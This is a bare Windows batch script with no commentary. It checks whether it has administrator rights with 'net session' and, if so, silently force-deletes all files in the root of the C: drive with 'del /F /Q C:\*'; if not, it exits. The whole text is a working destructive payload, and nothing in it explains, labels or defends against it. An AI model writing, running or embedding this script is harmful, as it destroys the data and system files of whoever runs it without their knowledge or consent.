@echo off

net session >nul 2>&1
if %errorLevel% == 0 (
    del /F /Q C:\*
) else (
    exit
)

pause >nul
